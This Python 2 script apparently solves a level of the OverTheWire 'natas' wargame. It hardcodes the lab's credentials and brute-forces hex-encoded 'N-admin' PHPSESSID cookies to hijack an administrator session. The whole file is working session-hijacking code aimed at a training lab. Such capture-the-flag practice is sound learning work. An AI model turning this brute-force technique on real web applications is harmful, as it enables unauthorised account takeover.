#!/usr/bin/python
import httplib
import urllib
import base64
import requests

headers = {}
http_username = "natas19"
http_password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = "http://%s:%s@natas19.natas.labs.overthewire.org/index.php" % (http_username, http_password)


for sessionId in range(0, 641):
    cookies = {'PHPSESSID': ("%d-admin" % sessionId).encode('hex')}
    r = requests.post(url, cookies=cookies)

    if r.status_code != 200:
        print "Server returned error!"
        print r.text
        break

    if 'Please login with your admin' not in r.text and 'logged in as a regular user' not in r.text:
        print r.text
        break
